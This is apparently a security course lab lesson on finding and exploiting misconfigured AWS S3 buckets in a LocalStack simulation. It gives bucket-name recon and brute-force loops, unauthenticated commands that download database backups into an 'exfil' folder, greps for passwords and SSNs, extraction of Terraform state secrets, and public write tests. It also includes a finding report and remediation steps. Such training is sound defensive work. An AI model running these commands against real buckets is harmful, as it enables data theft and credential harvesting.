---
title: "S3 Misconfiguration Lab — Enumerate and Extract Data from Misconfigured Buckets"
tags: [AWS, S3, misconfiguration, public-bucket, bucket-enumeration, ACL,
       bucket-policy, pre-signed-URL, data-exfiltration, lab, ATT&CK-T1530,
       ATT&CK-T1580, Twitch-breach, CWE-732]
module: 04-BroadSurface-02
day: 185
related_topics:
  - Cloud Threat Model (Day 181)
  - AWS IAM Fundamentals (Day 182)
  - SSRF to AWS Metadata Lab (Day 184)
  - Cloud Bug Bounty Strategy (Day 193)
  - Cloud Hardening (Day 195)
---

# Day 185 — S3 Misconfiguration Lab

> "The most common cloud finding in bug bounty is not a zero-day. It is a
> publicly readable S3 bucket with customer data sitting in it, indexed by
> Google, and ignored in the security team's backlog. I have seen six-figure
> bounties paid on a single `aws s3 ls` command. Know how to find these.
> Know how to prove the impact. Know what to say in the report."
>
> — Ghost

---

## Goals

By the end of this lab you will be able to:

1. Enumerate S3 bucket names using passive recon (Wayback Machine, Shodan,
   domain enumeration) and brute force.
2. Check a bucket for public read access using both AWS CLI and unauthenticated
   HTTP.
3. Extract data from a publicly accessible bucket and identify sensitive files.
4. Test bucket write access and demonstrate impact (upload, overwrite).
5. Identify misconfigurations in bucket policies and ACLs.
6. Write a complete S3 misconfiguration finding report with CVSS score.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| Cloud threat model | Day 181 |
| AWS CLI | Day 182 |
| Bug bounty recon techniques | Day 156 |
| Docker Compose | Days 150–151 |

---

## Lab Setup

```bash
cd learn-security/04-BroadSurface-02/samples/s3-lab/
docker compose up --build -d

# LocalStack simulates S3 with pre-configured misconfigured buckets
# Endpoint: http://localhost:4566
export AWS_ENDPOINT_URL=http://localhost:4566
export AWS_ACCESS_KEY_ID=test
export AWS_SECRET_ACCESS_KEY=test
export AWS_DEFAULT_REGION=us-east-1
```

### Pre-configured Lab Buckets

| Bucket | Misconfiguration | Sensitive data |
|---|---|---|
| `target-app-backups` | Public read ACL | Database dumps, user CSVs |
| `target-app-assets` | No misconfiguration | Static images — benign |
| `target-app-logs` | Public read via bucket policy | Application logs with PII |
| `target-app-uploads` | Public read + write | User uploads |
| `target-app-tfstate` | Public read | Terraform state with secrets |

---

## Part 1 — Bucket Discovery

### 1.1 — Passive Recon for Bucket Names

S3 bucket names are globally unique and frequently exposed in:

```bash
# Source 1: Wayback Machine — find bucket URLs in cached pages
curl -s "https://web.archive.org/cdx/search/cdx?\
url=*.s3.amazonaws.com&output=json&limit=50&fl=original" \
  | jq -r '.[1:][] | .[0]' | grep -oP 's3\.amazonaws\.com/\K[^/]+' | sort -u

# Source 2: GitHub — search for AWS_BUCKET in repos for the target domain
gh search code "s3.amazonaws.com target-app" --json path,textMatches \
  | jq -r '.[] | .path'

# Source 3: JavaScript bundles — bucket URLs hardcoded in frontend
curl -s https://target-app.com/static/main.js | \
  grep -oP '[a-z0-9.-]+\.s3[.-][a-z0-9-]*\.amazonaws\.com'

# Source 4: HTML source — direct references
curl -s https://target-app.com | grep -oP '[a-z0-9.-]+\.s3\.amazonaws\.com'

# Source 5: DNS — bucket CNAMEs in subdomain enumeration
# target-assets.target-app.com CNAME target-app-assets.s3.amazonaws.com
amass enum -d target-app.com | grep s3
```

### 1.2 — Bucket Name Brute Force

```bash
# Common naming patterns: {company}-{environment}, {company}-{service}, etc.
# Tool: s3-buckets-bruteforce (simple wordlist approach)

WORDLIST="company-name target-app target-prod target-dev target-staging \
          target-backup target-logs target-data target-uploads target-assets \
          target-app-prod target-app-dev target-app-backup target-app-logs"

for bucket in $WORDLIST; do
  # Try HTTPS — bucket exists and is public if we get anything other than 403/NoSuchBucket
  code=$(curl -so /dev/null -w '%{http_code}' \
    "https://${bucket}.s3.amazonaws.com/")
  if [ "$code" != "403" ] && [ "$code" != "404" ]; then
    echo "[+] $bucket → HTTP $code"
  fi
done
```

---

## Part 2 — Checking Access Without Credentials

### 2.1 — Unauthenticated HTTP Check

```bash
# List bucket contents — no AWS credentials needed if public
curl -s "https://target-app-backups.s3.amazonaws.com/"
# Or with LocalStack:
curl -s "http://localhost:4566/target-app-backups"

# Expected response for publicly readable bucket:
# <?xml version="1.0" encoding="UTF-8"?>
# <ListBucketResult>
#   <Name>target-app-backups</Name>
#   <Contents>
#     <Key>db-backup-2024-01-01.sql.gz</Key>
#     <Size>52428800</Size>
#   ...
```

### 2.2 — AWS CLI Without Credentials

```bash
# Check if bucket allows public listing (no creds required if public)
aws s3 ls s3://target-app-backups --no-sign-request

# If listing works, download sensitive files
aws s3 cp s3://target-app-backups/db-backup-2024-01-01.sql.gz . --no-sign-request
aws s3 sync s3://target-app-backups/ ./exfil/ --no-sign-request

# Check bucket ACL
aws s3api get-bucket-acl --bucket target-app-backups --no-sign-request

# Check bucket policy
aws s3api get-bucket-policy --bucket target-app-backups --no-sign-request \
  | jq '.Policy | fromjson'
```

---

## Objective 1 — Exploit Public Read Bucket

```bash
# 1. Enumerate the bucket
aws s3 ls s3://target-app-backups --no-sign-request --endpoint-url http://localhost:4566

# 2. List all objects recursively
aws s3 ls s3://target-app-backups/ --recursive --no-sign-request \
  --endpoint-url http://localhost:4566

# 3. Identify sensitive files
# Look for: .sql, .csv, .json, .env, .pem, .key, .tar.gz, tfstate

# 4. Download the highest-impact file
aws s3 cp s3://target-app-backups/db-backup-2024-01-01.sql.gz . \
  --no-sign-request \
  --endpoint-url http://localhost:4566

# 5. Extract and inspect
gunzip db-backup-2024-01-01.sql.gz
grep -i 'password\|email\|ssn\|credit_card\|api_key' db-backup-2024-01-01.sql | head -20
```

---

## Objective 2 — Exploit Public Terraform State

Terraform state files (`terraform.tfstate`) contain every resource's configuration,
including plaintext secrets passed as resource parameters.

```bash
# Download tfstate
aws s3 cp s3://target-app-tfstate/prod/terraform.tfstate . \
  --no-sign-request \
  --endpoint-url http://localhost:4566

# Extract secrets from state
cat terraform.tfstate | jq '.resources[].instances[].attributes' \
  | grep -iE 'password|secret|key|token|credential' | head -30

# Common sensitive fields in tfstate:
# aws_db_instance.password
# aws_iam_access_key.secret
# aws_secretsmanager_secret_version.secret_string
# aws_elasticache_cluster.auth_token
```

---

## Objective 3 — Exploit Public Write Access

```bash
# Test write access — upload a canary file
echo "s3-write-test-$(date +%s)" > canary.txt
aws s3 cp canary.txt s3://target-app-uploads/canary.txt \
  --no-sign-request \
  --endpoint-url http://localhost:4566
# → "upload: ./canary.txt to s3://target-app-uploads/canary.txt"

# Confirm the write succeeded
aws s3 ls s3://target-app-uploads/ --no-sign-request \
  --endpoint-url http://localhost:4566

# Higher-impact write: overwrite an existing file (e.g., config, JS bundle)
# In real scenarios: overwrite app.js → XSS / malware delivery
# ALWAYS clean up in authorised engagements — do not leave malicious files
aws s3 rm s3://target-app-uploads/canary.txt \
  --no-sign-request \
  --endpoint-url http://localhost:4566
```

---

## Part 3 — Reading Bucket Policy and ACL

```bash
# Get the bucket ACL — this shows who has what access
aws s3api get-bucket-acl --bucket target-app-logs \
  --endpoint-url http://localhost:4566 | jq .

# A misconfigured ACL looks like:
# {
#   "Grantee": {
#     "Type": "Group",
#     "URI": "http://acs.amazonaws.com/groups/global/AllUsers"  ← Everyone
#   },
#   "Permission": "READ"
# }

# Get the bucket policy — often more specific than ACL
aws s3api get-bucket-policy --bucket target-app-logs \
  --endpoint-url http://localhost:4566 | jq '.Policy | fromjson'
```

**Dangerous bucket policy — public read via Principal `"*"`:**

```json
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": ["s3:GetObject", "s3:ListBucket"],
    "Resource": [
      "arn:aws:s3:::target-app-logs",
      "arn:aws:s3:::target-app-logs/*"
    ]
  }]
}
```

---

## Part 4 — Pre-signed URL Abuse

Pre-signed URLs grant temporary access to a specific S3 object. Misuse scenarios:

```bash
# Generate a pre-signed URL (with valid credentials, for testing your own bucket)
aws s3 presign s3://target-app-uploads/report.pdf \
  --expires-in 86400 \
  --endpoint-url http://localhost:4566
# → https://...s3.amazonaws.com/...?X-Amz-Credential=...&X-Amz-Expires=86400&X-Amz-Signature=...

# Abuse scenarios:
# 1. Pre-signed URLs shared in emails/chats that expire slowly
# 2. Pre-signed URLs with long expiry (7 days = max for STS; 7 years for IAM user keys)
# 3. Pre-signed URLs that allow upload (PUT) to attacker-controlled paths
```

---

## Part 5 — Writing the S3 Misconfiguration Report

### Example: Public Read on Backup Bucket

```
Title: Unrestricted Public Read Access to Production Database Backup Bucket

Severity: Critical
CVSS: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N → 7.5 (High)
(Upgrade to Critical due to PII scale — programme policy)

Summary:
The S3 bucket target-app-backups allows unauthenticated read and list access
to any internet user. The bucket contains full database backups including
plaintext user records with email addresses, hashed passwords, physical
addresses, and partial payment card numbers. No credentials are required to
list or download any object.

Impact:
  Technical: Unauthenticated download of 52 GB database backup containing
    all user records.
  Operational: Approximately 1.4 million user accounts affected. Full PII
    exposure including email, physical address, and partial card data.
  Regulatory: GDPR Article 33 (72-hour breach notification required); CCPA
    mandatory disclosure; PCI DSS SAQ A scope expansion.

Steps to Reproduce:
  1. curl -s "https://target-app-backups.s3.amazonaws.com/"
     → Returns XML listing with all object keys and sizes.
  2. aws s3 cp s3://target-app-backups/db-backup-2024-01-01.sql.gz . --no-sign-request
     → Downloads 52 GB backup without authentication.
  3. gunzip + grep for PII fields confirms sensitive data.

Proof of Concept:
  $ curl -so /dev/null -w '%{http_code}' https://target-app-backups.s3.amazonaws.com/
  200
  $ aws s3 ls s3://target-app-backups --no-sign-request | wc -l
  847

Remediation:
  1. Remove AllUsers READ grant from bucket ACL immediately.
  2. Apply a bucket policy that explicitly denies public access:
     aws s3api put-public-access-block \
       --bucket target-app-backups \
       --public-access-block-configuration \
         'BlockPublicAcls=true,IgnorePublicAcls=true,
          BlockPublicPolicy=true,RestrictPublicBuckets=true'
  3. Audit all S3 buckets using AWS Config rule: s3-bucket-public-read-prohibited.
  4. Enable S3 Block Public Access at the account level (prevents any bucket
     from being public without explicitly overriding the account-level setting).
```

---

## Key Takeaways

1. **Public S3 buckets are found through passive recon, not scanning.** Bucket
   names leak through JavaScript bundles, HTML source, Wayback Machine, and
   GitHub repositories. Find the name, then check the access.
2. **`--no-sign-request` is the attacker's flag.** If `aws s3 ls` works
   without credentials, the bucket is publicly readable. No further access
   required — the data is open to the internet.
3. **Terraform state is the highest-value S3 object.** It contains the
   plaintext values of every secret passed as a resource argument. One tfstate
   file can expose dozens of credentials.
4. **Write access to a static asset bucket enables content injection.** An
   attacker who can overwrite `app.js` on a CDN-backed S3 bucket has reflected
   XSS on every page that loads it — for every user, not just the one who
   clicks a malicious link.
5. **S3 Block Public Access at the account level is the single most impactful
   S3 security control.** It cannot be overridden by bucket-level settings and
   prevents any future accidental public exposure.

---

## Exercises

1. On the lab: find and enumerate all five pre-configured buckets. For each,
   document: is it publicly readable? Is it publicly writable? What sensitive
   data does it contain? Estimate the CVSS score for each finding.
2. Write a Python script using `boto3` that checks every bucket in an account
   for public access (using `get-public-access-block`, `get-bucket-acl`, and
   `get-bucket-policy`) and outputs a report. Handle exceptions for buckets
   that do not exist or deny access.
3. Research: what is S3 Object Ownership and how does it interact with ACLs?
   What is the `BucketOwnerEnforced` setting and how does it simplify access
   control?
4. Research the Twitch 2021 data breach. What was leaked? Was the bucket
   publicly accessible, or was it accessed with stolen credentials? What
   control failed?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q185.1, Q185.2 …).
> Follow-up questions use hierarchical numbering (Q185.1.1, Q185.1.2 …).

---

## Navigation

← Previous: [Day 184 — SSRF to AWS Metadata Lab](DAY-0184-SSRF-to-AWS-Metadata-Lab.md)
→ Next: [Day 186 — AWS Enumeration with Pacu](DAY-0186-AWS-Enumeration-with-Pacu.md)
